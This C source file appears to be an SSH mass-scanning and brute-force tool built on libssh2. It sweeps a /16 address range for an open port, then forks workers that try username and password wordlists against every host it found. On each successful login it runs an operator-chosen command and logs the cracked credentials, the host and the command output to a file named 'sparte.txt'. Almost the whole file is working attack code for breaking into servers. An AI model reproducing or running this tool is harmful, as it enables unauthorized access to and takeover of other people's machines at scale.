#define LIBSSH2_STATIC 1
#include "libssh2_config.h"
#include <libssh2.h>
#ifdef HAVE_WINSOCK2_H
# include <winsock2.h>
#endif
#ifdef HAVE_SYS_SOCKET_H
# include <sys/socket.h>
#endif
#ifdef HAVE_NETINET_IN_H
# include <netinet/in.h>
#endif
#ifdef HAVE_SYS_SELECT_H
# include <sys/select.h>
#endif
# ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif
#ifdef HAVE_ARPA_INET_H
# include <arpa/inet.h>
#endif
#include <sys/time.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <termios.h>
#define ALB "\033[1;37m"
#define ALB2 "\033[5;37m"
#define NORM  "\033[00;00m"
#define BOLD "\033[00;01m"
#define ROSU "\033[01;31m"
#define GALBE  "\033[01;33m"
#define VERDE "\033[01;32m"
#define ALBASTRU "\033[01;34m"
#define FAKE "./jahid" 

#define COMPUTATIONS 3000
#define TOTAL_VAL_COUNT 254
#define MAX_SOCKETS 1000
#define TIMEOUT 3

#define S_NONE       0
#define S_CONNECTING 1
#define TABLELEN        63
#define BUFFFERLEN      128

#define ENCODERLEN      4
#define ENCODEROPLEN    0
#define ENCODERBLOCKLEN 3

#define PADDINGCHAR     '='
#define BASE64CHARSET   "ABCDEFGHIJKLMNOPQRSTUVWXYZ"\
                        "abcdefghijklmnopqrstuvwxyz"\
                        "0123456789"\
                        "+/";
#define _FILE_OFFSET_BITS 64
#define EOL               '\n'
#define CAR_RETURN '\r'
#define SUCCESS 0
#define FAILURE -1


struct conn_t {
    int s;
    char status;
    time_t a;
    struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void check_sockets(void);
void fatal(char *);

FILE *outfd;
int tot = 0;
int flag,where;
int numforks,maxf;

unsigned char denominator = TOTAL_VAL_COUNT+1;



char *replace_str(char *str, char *orig, char *rep)
{
  static char buffer[4096];
  char *p;

  if(!(p = strstr(str, orig)))  
    return str;

  strncpy(buffer, str, p-str); 
  buffer[p-str] = '\0';

  sprintf(buffer+(p-str), "%s%s", rep, p+strlen(orig));

  return buffer;
}


void init_sockets(void)
{
    int i;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        connlist[i].status = S_NONE;
        memset((struct sockaddr_in *)&connlist[i].addr, 0, sizeof(struct sockaddr_in));
    }
    return;
}

void check_sockets(void)
{
    int i, ret;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        if ((connlist[i].a < (time(0) - TIMEOUT)) && (connlist[i].status == S_CONNECTING))
        {
            close(connlist[i].s);
            connlist[i].status = S_NONE;
        }
        else if (connlist[i].status == S_CONNECTING)
        {
            ret = connect(connlist[i].s, (struct sockaddr *)&connlist[i].addr,
                sizeof(struct sockaddr_in));
            if (ret == -1)
            {
                if (errno == EISCONN)
                {
                    tot++;
                    fprintf(outfd, "%s\n",
                        (char *)inet_ntoa(connlist[i].addr.sin_addr));
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }

                if ((errno != EALREADY) && (errno != EINPROGRESS))
                {
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }
            }
            else
            {
                tot++;
                fprintf(outfd, "%s\n",
                    (char *)inet_ntoa(connlist[i].addr.sin_addr));
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            }
        }
    }
}

void fatal(char *err)
{
    int i;
    printf("Error: %s\n", err);
    for (i = 0; i < MAX_SOCKETS; i++)
        if (connlist[i].status >= S_CONNECTING)
            close(connlist[i].s);
    fclose(outfd);
    exit(EXIT_FAILURE);
}

static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;

    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    FD_ZERO(&fd);

    FD_SET(socket_fd, &fd);

    dir = libssh2_session_block_directions(session);


    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;

    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;

    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);

    return rc;
}

 int checkauth(char *username,char *password,char *hostname, char *portar, char *command) 
{
    const char *commandline = command;
    FILE *vulnf,*nolog;
    unsigned long hostaddr;
    int sock, port;
    struct sockaddr_in sin;
    const char *fingerprint;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    int rc;
    int exitcode;
    char *exitsignal=(char *)"none";
    int bytecount = 0;
    size_t len;
    int type, var;
    struct timeval timeout;      
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    port=atoi(portar);
    rc = libssh2_init (0);

    if (rc != 0) {
        fprintf (stderr, "libssh2 initialization failed (%d)\n", rc);
        return 1;
    }

    hostaddr = inet_addr(hostname);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = hostaddr;

    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
        error("setsockopt failed\n");

    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,
                sizeof(timeout)) < 0)
        error("setsockopt failed\n");

    if (connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
        return -1;
    }

    session = libssh2_session_init();

    while ((rc = libssh2_session_handshake(session, sock)) ==

           LIBSSH2_ERROR_EAGAIN);
    if (rc) {

        return -1;
    }

        while ((rc = libssh2_userauth_password(session, username, password)) ==

               LIBSSH2_ERROR_EAGAIN);
        if (rc) {

            goto shutdown;
        }


    while( (channel = libssh2_channel_open_session(session)) == NULL &&

           libssh2_session_last_error(session,NULL,NULL,0) ==

           LIBSSH2_ERROR_EAGAIN )
    {
        waitsocket(sock, session);
    }
    if( channel == NULL )
    {

        goto shutdown;
    }

    while( (rc = libssh2_channel_exec(channel, commandline)) ==

           LIBSSH2_ERROR_EAGAIN )
    {
        waitsocket(sock, session);
    }


    if( rc != 0 )
    {

        goto shutdown;
    }


    for( ;; )
    {

        int rc;
        do
        {
            char buffer[65535];
            rc = libssh2_channel_read( channel, buffer, sizeof(buffer) );

            if( rc > 0 )
            {
                int i;
                bytecount += rc;
                hostname = strtok (hostname, "\n");
		fprintf(stderr, "[*] WOW   : %s:%s %s port: %s \n", username,password,hostname, portar);
		fprintf(stderr, "[*] Kernel: %s \n", buffer);
                vulnf=fopen("sparte.txt","a+");
                fprintf(vulnf,"%s:%s %s port: %s --> %s  \n",username,password,hostname,portar, buffer);
                fclose(vulnf);
                goto shutdown;
                for( i=0; i < rc; ++i )
                var = i;
            }

            else {
                if( rc != LIBSSH2_ERROR_EAGAIN )

                    goto shutdown;
            }
        }
        while( rc > 0 );


        if( rc == LIBSSH2_ERROR_EAGAIN )
        {
            waitsocket(sock, session);
        }
        else
            break;
    }

    exitcode = 127;
    while( (rc = libssh2_channel_close(channel)) == LIBSSH2_ERROR_EAGAIN )

        waitsocket(sock, session);

    if( rc == 0 )
    {
        exitcode = libssh2_channel_get_exit_status( channel );

        libssh2_channel_get_exit_signal(channel, &exitsignal,

                                        NULL, NULL, NULL, NULL, NULL);
    }

    if (exitsignal)
        var = var;
    else
        var = var;

    libssh2_channel_free(channel);
    close(sock);
    channel = NULL;
    libssh2_session_disconnect(session,

                               "Normal Shutdown, Thank you for playing");
    libssh2_session_free(session);
    libssh2_exit();
    exit(0);

shutdown:

    libssh2_session_disconnect(session,

                               "Normal Shutdown, Thank you for playing");
    libssh2_session_free(session);

#ifdef WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    var = var;

    libssh2_exit();
    return 0;
 }

int scanbclass(char *bclass, char *port)
{
int done = 0, i, cip = 1, bb = 0, ret, k, ns, x;
    time_t scantime;
    char ip[20], outfile[128], last[256];
    int unlink(const char *pathname);

    errno = 0;
    if(unlink("scan.log"))
    {
        printf("\n unlink() failed - [%s]\n",strerror(errno));
    }
    memset(&outfile, 0, sizeof(outfile));

    snprintf(outfile, sizeof(outfile) - 1, "scan.log", bclass, port);

    if (!(outfd = fopen(outfile, "a")))
    {
        perror(outfile);
        exit(EXIT_FAILURE);
    }
    printf("[-] Searching: ", bclass);
    fflush(stdout);

    memset(&last, 0, sizeof(last));
    init_sockets();
    scantime = time(0);

    while(!done)
    {
        for (i = 0; i < MAX_SOCKETS; i++)
        {
            if (cip == 255)
            {           
                if (bb == 255) 
                {
                    ns = 0;
                    for (k = 0; k < MAX_SOCKETS; k++)
                    {
                        if (connlist[k].status > S_NONE)
                        {
                            ns++;
                            break;
                        }
                    }

                    if (ns == 0)
                        done = 1;

                     break;
                }
                else
                {
                    cip = 0;
                    bb++;
                    for (x = 0; x < strlen(last); x++)
                        putchar('\b');
                    memset(&last, 0, sizeof(last));
                    snprintf(last, sizeof(last) - 1, "%s.%d.* on port: %s [Found: %d] [%.1f%% Done]",
                        bclass, bb, port, tot, (bb / 255.0) * 100);
                    printf("%s", last);
                    fflush(stdout);
                }
            }

            if (connlist[i].status == S_NONE)
            {
                connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
                if (connlist[i].s == -1)
                    printf("Unable to allocate socket.\n");
                else
                {
                    ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
                    if (ret == -1)
                    {
                        printf("Unable to set O_NONBLOCK\n");
                        close(connlist[i].s);
                    }
                    else
                    {
                        memset(&ip, 0, 20);
                        sprintf(ip, "%s.%d.%d", bclass, bb, cip);
                        connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
                        if (connlist[i].addr.sin_addr.s_addr == -1)
                            fatal("Invalid IP.");
                        connlist[i].addr.sin_family = AF_INET;
                        connlist[i].addr.sin_port = htons(atoi(port));
                        connlist[i].a = time(0);
                        connlist[i].status = S_CONNECTING;
                        cip++;
                    }
                }
            }
        }
        check_sockets();
    }

    printf("\n[!] Scanning complete In %u Seconds. [We got %d ips]\n", (time(0) - scantime), tot);
    fclose(outfd);
    return 1;
}


int line_count(char* __str_file_name) {
  FILE* fd;
  int ch;  
  if ((fd = fopen(__str_file_name, "r")) == NULL) {
      printf("[Error] : While opening the file\n");
      exit(0);
  }

  unsigned int line_count = 0;
  while ( (ch = fgetc(fd)) != EOF)
     if (ch == EOL || ch == CAR_RETURN)
         ++line_count;

  if (fd) {
     fclose(fd);
  }

  return line_count;
}

int scan(char *app, char *thr, char *ipfile, char *userfile, char *passfile, char *portar, char *commandline)
{
  int numforks, maxf, status;
  FILE *fp,*passf, *userf;
  char buff[4096];
  char nutt2[4096];
  char nutt[4096];
  char *pass, *user;
  malloc(sizeof(nutt));
  malloc(sizeof(nutt2));
  malloc(sizeof(buff));
  pid_t PID;
  char *ns = NULL;
      maxf=atoi(thr);
      if((userf=fopen(userfile,"r"))==NULL) exit(printf("FATAL: Cannot open %s \n", userfile));
      while (fgets(nutt2,sizeof(nutt2),userf)){
      user = strdup (nutt2);
      user = strtok (user, "\n");
      if((passf=fopen(passfile,"r"))==NULL) exit(printf("FATAL: Cannot open %s \n", passfile));
      while (fgets(nutt,sizeof(nutt),passf)) {
      pass = strdup (nutt);
      pass = strtok (pass, "\n");
      ns = replace_str(pass, "$user", user);
      printf("[*] Trying: %s:%s on found ips\n",user,ns);
      if((fp=fopen(ipfile,"r"))==NULL) exit(printf("FATAL: Cannot open %s", ipfile));
      while(fgets(buff,sizeof(buff),fp))
       {   
      PID = fork();
      if (PID < 0) {
      fprintf(stderr, "[!] Couldn't fork!\n");
      exit(1);
      }
      if (( PID == 0 )){

      checkauth(user,ns,buff, portar, commandline);
      //printf("[*] Trying: %s:%s %s:%s  Protocol:%s\n",user,ns, buff,portar,prot); 
      exit(0);
      }
      else            
        {
         numforks++;
         if (numforks > maxf)
         for (numforks; numforks > maxf; numforks--)
         PID = wait(&status);
        }
       }
       fclose(fp);
      }
       fclose(passf);
      }
       fclose(userf);
exit(0);
}

int main(int argc, char *argv[])
{
     int input,i=0;
     FILE *fp,*passf, *userf, *scanf;
     char encodedoutput[BUFFFERLEN + 1] = "";
     char decodedoutput[BUFFFERLEN + 1] = "";
     char *userfile, *passfile, *command, *threads, *scanfile, *bclass, *port, *t2, *prot;
        if(strcmp(argv[1],"-f")==0) { input = 1; }
        if(strcmp(argv[1],"-r")==0) { input = 2; }
        if(strcmp(argv[1],"-R")==0) { input = 3; }
        if(strcmp(argv[1],"-b")==0) { input = 4; }

    switch ( input ) {

        case 1: 
         for (i = 0; i < argc; i++){
         if(strcmp(argv[i],"-p")   ==0) { port     = argv[i+1]; }
         if(strcmp(argv[i],"-user")==0) { userfile = argv[i+1]; }
         if(strcmp(argv[i],"-pass")==0) { passfile = argv[i+1]; }
         if(strcmp(argv[i],"-t")   ==0) { threads  = argv[i+1]; } 
         if(strcmp(argv[i],"-c")   ==0) { command  = argv[i+1]; }
         }
         scanfile = argv[2];
         if((scanf=fopen(scanfile,"r"))!= NULL){ 
         if (atoi(threads)) { 
         if (atoi(port) > 2) { 
         if((userf=fopen(userfile,"r"))!=NULL){ 
         if((passf=fopen(passfile,"r"))!=NULL){ 
         if(command != NULL) { scan(argv[0],threads,scanfile,userfile,passfile,port,command);} 
           else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
        break;

        case 2:          
         for (i = 0; i < argc; i++){
         if(strcmp(argv[i],"-p")   ==0) { port     = argv[i+1]; }
         if(strcmp(argv[i],"-user")==0) { userfile = argv[i+1]; }
         if(strcmp(argv[i],"-pass")==0) { passfile = argv[i+1]; }
         if(strcmp(argv[i],"-t")   ==0) { threads  = argv[i+1]; }
         if(strcmp(argv[i],"-c")   ==0) { command  = argv[i+1]; }
         }
         if (atoi(threads)) { 
         if (atoi(port) > 2) { 
         if((userf=fopen(userfile,"r"))!=NULL){ 
         if((passf=fopen(passfile,"r"))!=NULL){ 
         if(command != NULL) { 
         //genrand(argv[0],threads,userfile,passfile,port,command);
         } 
           else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
        break;

        case 3:         
         for (i = 0; i < argc; i++){
         if(strcmp(argv[i],"-p")   ==0) { port     = argv[i+1]; }
         if(strcmp(argv[i],"-t")   ==0) { threads  = argv[i+1]; } 
         }
         if (atoi(threads)) { 
         if (atoi(port) > 2) { 
         //genrandl(threads, port);
         } else { goto err; }
         } else { goto err; }
        break;

        case 4:        
         for (i = 0; i < argc; i++){
         if(strcmp(argv[i],"-p")   ==0) { port     = argv[i+1]; }
         if(strcmp(argv[i],"-user")==0) { userfile = argv[i+1]; }
         if(strcmp(argv[i],"-pass")==0) { passfile = argv[i+1]; }
         if(strcmp(argv[i],"-t")   ==0) { threads  = argv[i+1]; } 
         if(strcmp(argv[i],"-c")   ==0) { command  = argv[i+1]; }
         }
         bclass = argv[2];
         if (atoi(threads)) { 
         if (atoi(port) > 2) { 
         if((userf=fopen(userfile,"r"))!=NULL){ 
         if((passf=fopen(passfile,"r"))!=NULL){ 
         if(command != NULL) { 

         scanbclass(bclass, port);
         scan(argv[0],threads,"scan.log",userfile,passfile,port, command);
         } 
           else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }
         } else { goto err; }

        break;

        default:            
         printf( "Bad command, quitting!\n" );
         exit (0);
         break;
    }
    getchar();
         exit (0);
         err:
         exit (-1);
}
